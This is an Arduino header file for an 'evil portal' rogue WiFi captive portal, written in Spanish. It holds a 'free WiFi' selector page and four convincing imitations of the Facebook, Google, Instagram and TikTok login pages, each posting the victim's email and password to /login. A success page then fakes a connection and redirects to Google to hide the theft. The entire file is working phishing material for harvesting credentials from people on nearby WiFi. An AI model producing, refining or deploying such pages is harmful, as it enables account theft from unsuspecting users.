#ifndef EVIL_PORTAL_HTML_H
#define EVIL_PORTAL_HTML_H

#include <Arduino.h>

// ═══════════════════════════════════════════════════════════════════════════
//  HTMLs DEL PORTAL CAUTIVO
//  Todos los formularios usan POST a /login con campos email/password
//  Después de submit, /success muestra "Conectando..." y luego redirige
// ═══════════════════════════════════════════════════════════════════════════

// ───── Selector de plataforma (página inicial) ────────────────────────────
const char html_selector[] PROGMEM = R"rawliteral(<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Acceso WiFi</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
       background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
       min-height: 100vh; display: flex; align-items: center; justify-content: center;
       padding: 20px; }
.container { background: white; border-radius: 16px; padding: 30px 25px; width: 100%;
             max-width: 400px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
.header { text-align: center; margin-bottom: 25px; }
.wifi-icon { font-size: 48px; margin-bottom: 10px; }
h1 { font-size: 22px; color: #1a1a1a; margin-bottom: 8px; }
.subtitle { color: #666; font-size: 14px; line-height: 1.5; }
.network-name { background: #f0f4ff; padding: 8px 15px; border-radius: 8px;
                margin: 15px 0; font-weight: 600; color: #4a5fc1; font-size: 14px; }
.divider { text-align: center; color: #999; font-size: 13px; margin: 20px 0;
           position: relative; }
.divider::before, .divider::after { content: ''; position: absolute; top: 50%;
                                     width: 30%; height: 1px; background: #ddd; }
.divider::before { left: 0; }
.divider::after { right: 0; }
.btn { display: flex; align-items: center; gap: 12px; width: 100%; padding: 14px 18px;
       margin-bottom: 12px; border: 1px solid #e0e0e0; border-radius: 10px;
       text-decoration: none; color: #333; font-size: 15px; font-weight: 500;
       transition: all 0.2s; cursor: pointer; background: white; }
.btn:hover, .btn:active { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
.btn-fb { border-color: #1877F2; }
.btn-fb .icon { color: #1877F2; }
.btn-gg { border-color: #4285F4; }
.btn-ig { border-color: #E4405F; }
.btn-ig .icon { color: #E4405F; }
.btn-tt { border-color: #000; }
.icon { width: 28px; height: 28px; flex-shrink: 0; }
.footer { text-align: center; color: #999; font-size: 12px; margin-top: 20px;
          padding-top: 15px; border-top: 1px solid #eee; }
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <div class="wifi-icon">📶</div>
    <h1>Acceso a WiFi Gratis</h1>
    <div class="network-name">__SSID__</div>
    <p class="subtitle">Para continuar, inicia sesión con una de tus cuentas:</p>
  </div>
  <a href="/fb" class="btn btn-fb">
    <svg class="icon" viewBox="0 0 24 24" fill="currentColor"><path d="M22 12c0-5.52-4.48-10-10-10S2 6.48 2 12c0 4.84 3.44 8.87 8 9.8V15H8v-3h2V9.5C10 7.57 11.57 6 13.5 6H16v3h-2c-.55 0-1 .45-1 1v2h3v3h-3v6.95c5.05-.5 9-4.76 9-9.95z"/></svg>
    <span>Continuar con Facebook</span>
  </a>
  <a href="/gg" class="btn btn-gg">
    <svg class="icon" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
    <span>Continuar con Google</span>
  </a>
  <a href="/ig" class="btn btn-ig">
    <svg class="icon" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
    <span>Continuar con Instagram</span>
  </a>
  <a href="/tt" class="btn btn-tt">
    <svg class="icon" viewBox="0 0 24 24" fill="currentColor"><path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64 2.93 2.93 0 0 1 .88.13V9.4a6.84 6.84 0 0 0-1-.05A6.33 6.33 0 0 0 5.8 20.1a6.34 6.34 0 0 0 10.86-4.43v-7a8.16 8.16 0 0 0 4.77 1.52v-3.4a4.85 4.85 0 0 1-1-.05z"/></svg>
    <span>Continuar con TikTok</span>
  </a>
  <div class="footer">Al continuar, aceptas las condiciones del servicio</div>
</div>
</body>
</html>)rawliteral";

// ───── Página de éxito (después del POST /login) ──────────────────────────
const char html_success[] PROGMEM = R"rawliteral(<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
       background: #f5f5f5; min-height: 100vh; display: flex;
       align-items: center; justify-content: center; padding: 20px; }
.box { background: white; border-radius: 14px; padding: 40px 30px; max-width: 360px;
       width: 100%; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.1); }
.spinner { width: 50px; height: 50px; border: 4px solid #e0e0e0;
           border-top-color: #4285F4; border-radius: 50%;
           animation: spin 1s linear infinite; margin: 0 auto 20px; }
@keyframes spin { to { transform: rotate(360deg); } }
h1 { color: #333; font-size: 20px; margin-bottom: 10px; }
p { color: #666; font-size: 14px; line-height: 1.5; }
</style>
<script>
setTimeout(function() {
  document.getElementById('msg').innerHTML =
    '<div style="font-size:48px;color:#4caf50;margin-bottom:15px;">&#10003;</div>' +
    '<h1>Conectado</h1><p>Ya puedes navegar.</p>';
  setTimeout(function() { window.location.href = 'https://www.google.com'; }, 2000);
}, 3500);
</script>
</head>
<body>
<div class="box" id="msg">
  <div class="spinner"></div>
  <h1>Conectando...</h1>
  <p>Verificando credenciales y estableciendo conexión segura. Por favor espera un momento.</p>
</div>
</body>
</html>)rawliteral";

// ───── Facebook (mejorado, responsive) ────────────────────────────────────
// ───── Facebook (mejorado, responsive, con logo oficial) ──────────────────
const char html_facebook[] PROGMEM = R"rawliteral(<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Facebook - Iniciar sesion</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
       background: #f0f2f5; min-height: 100vh; display: flex; flex-direction: column;
       align-items: center; justify-content: center; padding: 20px; color: #1c1e21; }
.container { width: 100%; max-width: 400px; }
.logo { text-align: center; margin-bottom: 20px; }
.logo svg { width: 100px; height: 100px; }
.box { background: white; border-radius: 8px; padding: 25px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
.box h2 { font-size: 17px; font-weight: 400; text-align: center; margin-bottom: 18px; color: #1c1e21; }
input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2;
        border-radius: 6px; font-size: 17px; }
input:focus { outline: none; border-color: #1877F2; box-shadow: 0 0 0 2px rgba(24,119,242,0.2); }
button { width: 100%; padding: 12px; background: #1877F2; color: white; border: none;
         border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer;
         margin-top: 6px; }
button:active { background: #166fe5; }
.forgot { display: block; text-align: center; color: #1877F2; font-size: 14px;
          margin-top: 16px; text-decoration: none; }
.divider { height: 1px; background: #dadde1; margin: 20px 0; }
.create { display: block; margin: 0 auto; padding: 12px 20px; background: #42b72a;
          color: white; border-radius: 6px; font-size: 15px; font-weight: bold;
          text-decoration: none; width: fit-content; }
</style>
</head>
<body>
<div class="container">
  <div class="logo">
    <svg viewBox="0 0 36 36" fill="#1877F2">
      <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 18h-3.5v-4H14v-2.5c0-3.59 2.039-5.5 5.39-5.5 1.6 0 2.81.16 3.18.21V10h-2.18c-1.83 0-2.39 1.13-2.39 2.31V14h4l-.5 4h-3.5v17.87z"/>
    </svg>
  </div>
  <div class="box">
    <h2>Iniciar sesion en Facebook</h2>
    <form action="/login" method="POST">
      <input type="hidden" name="platform" value="Facebook">
      <input type="text" name="email" placeholder="Correo electronico o telefono" required autofocus>
      <input type="password" name="password" placeholder="Contrasena" required>
      <button type="submit">Iniciar sesion</button>
    </form>
    <a href="#" class="forgot">Olvidaste tu contrasena?</a>
    <div class="divider"></div>
    <a href="#" class="create">Crear cuenta nueva</a>
  </div>
</div>
</body>
</html>)rawliteral";

// ───── Google (mejorado, responsive) ──────────────────────────────────────
const char html_google[] PROGMEM = R"rawliteral(<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Iniciar sesión - Cuentas de Google</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #fff;
       min-height: 100vh; display: flex; align-items: center; justify-content: center;
       padding: 20px; color: #202124; }
.container { width: 100%; max-width: 450px; border: 1px solid #dadce0;
             border-radius: 8px; padding: 40px; }
.logo { text-align: center; margin-bottom: 16px; }
.logo svg { height: 24px; }
h1 { text-align: center; font-size: 24px; font-weight: 400; margin-bottom: 8px; }
.subtitle { text-align: center; font-size: 16px; color: #202124; margin-bottom: 30px; }
input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px;
        font-size: 16px; margin-bottom: 14px; transition: border-color 0.2s; }
input:focus { outline: none; border-color: #1a73e8; box-shadow: 0 0 0 1px #1a73e8; }
.help-text { color: #5f6368; font-size: 14px; margin: 12px 0 24px; }
.help-text a { color: #1a73e8; text-decoration: none; font-weight: 500; }
.actions { display: flex; justify-content: space-between; align-items: center;
           margin-top: 32px; }
.create-link { color: #1a73e8; text-decoration: none; font-weight: 500; font-size: 14px; }
button { padding: 10px 24px; border: none; background: #1a73e8; color: white;
         border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer;
         font-family: inherit; }
button:active { background: #1765c4; }
@media (max-width: 480px) {
  .container { padding: 30px 20px; border: none; }
  .actions { flex-direction: column-reverse; gap: 16px; align-items: stretch; }
  button { width: 100%; padding: 12px; }
  .create-link { text-align: center; }
}
</style>
</head>
<body>
<div class="container">
  <div class="logo">
    <svg viewBox="0 0 75 24" height="24"><g><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"/></g><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"/><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"/><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"/><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"/><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"/></svg>
  </div>
  <h1>Iniciar sesión</h1>
  <p class="subtitle">Utiliza tu Cuenta de Google</p>
  <form action="/login" method="POST">
    <input type="hidden" name="platform" value="Google">
    <input type="text" name="email" placeholder="Correo electrónico o teléfono" required autofocus>
    <input type="password" name="password" placeholder="Ingresa tu contraseña" required>
    <p class="help-text"><a href="#">¿Olvidaste tu correo electrónico?</a></p>
    <div class="actions">
      <a href="#" class="create-link">Crear cuenta</a>
      <button type="submit">Siguiente</button>
    </div>
  </form>
</div>
</body>
</html>)rawliteral";

// ───── Instagram (mejorado, responsive) ───────────────────────────────────
const char html_instagram[] PROGMEM = R"rawliteral(<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Instagram</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
       background: #fafafa; min-height: 100vh; display: flex; flex-direction: column;
       align-items: center; justify-content: center; padding: 20px; }
.container { width: 100%; max-width: 350px; }
.box { background: white; border: 1px solid #dbdbdb; padding: 30px 40px;
       text-align: center; border-radius: 1px; }
.logo { margin: 22px 0 12px; }
.logo svg { width: 175px; height: 51px; }
input { width: 100%; padding: 9px 8px; margin-bottom: 6px; background: #fafafa;
        border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; }
input:focus { outline: none; border-color: #a8a8a8; }
button { width: 100%; padding: 7px; background: #0095f6; color: white; border: none;
         border-radius: 4px; font-weight: 600; cursor: pointer; margin-top: 8px;
         font-size: 14px; }
button:active { background: #007bd1; }
.divider { display: flex; align-items: center; margin: 18px 0; color: #8e8e8e;
           font-size: 13px; font-weight: 600; }
.divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #dbdbdb; }
.divider::before { margin-right: 18px; }
.divider::after { margin-left: 18px; }
.fb-link { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; }
.forgot { display: block; color: #00376b; font-size: 12px; margin-top: 12px;
          text-decoration: none; }
.signup-box { background: white; border: 1px solid #dbdbdb; padding: 20px;
              text-align: center; margin-top: 10px; border-radius: 1px; font-size: 14px; }
.signup-box a { color: #0095f6; font-weight: 600; text-decoration: none; }
</style>
</head>
<body>
<div class="container">
  <div class="box">
    <div class="logo">
      <svg width="175" height="51" viewBox="0 0 175 51">
        <defs>
          <linearGradient id="igGrad" x1="0%" y1="100%" x2="100%" y2="0%">
            <stop offset="0%" stop-color="#fdf497"/>
            <stop offset="5%" stop-color="#fdf497"/>
            <stop offset="45%" stop-color="#fd5949"/>
            <stop offset="60%" stop-color="#d6249f"/>
            <stop offset="90%" stop-color="#285AEB"/>
          </linearGradient>
        </defs>
        <rect x="0" y="5" width="40" height="40" rx="10" ry="10" fill="url(#igGrad)"/>
        <circle cx="20" cy="25" r="10" fill="none" stroke="white" stroke-width="3"/>
        <circle cx="31" cy="13" r="2.5" fill="white"/>
        <text x="50" y="35" font-family="'Billabong','Grand Hotel',cursive,sans-serif" font-size="32" font-weight="400" fill="#262626">Instagram</text>
      </svg>
    </div>
    <form action="/login" method="POST">
      <input type="hidden" name="platform" value="Instagram">
      <input type="text" name="email" placeholder="Teléfono, usuario o correo electrónico" required autofocus>
      <input type="password" name="password" placeholder="Contraseña" required>
      <button type="submit">Iniciar sesión</button>
    </form>
    <div class="divider">O</div>
    <a href="#" class="fb-link">Iniciar sesión con Facebook</a>
    <a href="#" class="forgot">¿Olvidaste la contraseña?</a>
  </div>
  <div class="signup-box">
    ¿No tienes una cuenta? <a href="#">Regístrate</a>
  </div>
</div>
</body>
</html>)rawliteral";

// ───── TikTok (mejorado, responsive, modo oscuro) ─────────────────────────
const char html_tiktok[] PROGMEM = R"rawliteral(<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Inicia sesión - TikTok</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
       background: #000; color: #fff; min-height: 100vh; display: flex;
       align-items: center; justify-content: center; padding: 20px; }
.container { width: 100%; max-width: 400px; padding: 30px; background: #121212;
             border-radius: 12px; border: 1px solid #2f2f2f; }
.logo { text-align: center; margin-bottom: 25px; }
.logo svg { height: 40px; }
h1 { font-size: 24px; text-align: center; margin-bottom: 8px; font-weight: 700; }
.subtitle { text-align: center; color: #a8a8a8; font-size: 14px; margin-bottom: 30px; }
input { width: 100%; padding: 14px 16px; background: #1f1f1f; border: 1px solid #2f2f2f;
        color: white; border-radius: 4px; margin-bottom: 12px; font-size: 15px;
        font-family: inherit; }
input:focus { outline: none; border-color: #fe2c55; }
button { width: 100%; padding: 14px; background: #fe2c55; color: white; border: none;
         border-radius: 4px; font-size: 16px; font-weight: 700; cursor: pointer;
         margin-top: 8px; font-family: inherit; }
button:active { background: #e6244a; }
.forgot { display: block; text-align: center; color: #a8a8a8; font-size: 13px;
          margin-top: 18px; text-decoration: none; }
</style>
</head>
<body>
<div class="container">
  <div class="logo">
    <svg viewBox="0 0 120 40" height="40"><text x="0" y="30" font-family="Helvetica,Arial,sans-serif" font-size="28" font-weight="900" fill="white">Tik</text><text x="50" y="30" font-family="Helvetica,Arial,sans-serif" font-size="28" font-weight="900" fill="#fe2c55">Tok</text></svg>
  </div>
  <h1>Inicia sesión</h1>
  <p class="subtitle">Administra tu cuenta y crea contenido increíble</p>
  <form action="/login" method="POST">
    <input type="hidden" name="platform" value="TikTok">
    <input type="text" name="email" placeholder="Correo, usuario o teléfono" required autofocus>
    <input type="password" name="password" placeholder="Contraseña" required>
    <button type="submit">Iniciar sesión</button>
  </form>
  <a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
</div>
</body>
</html>)rawliteral";

#endif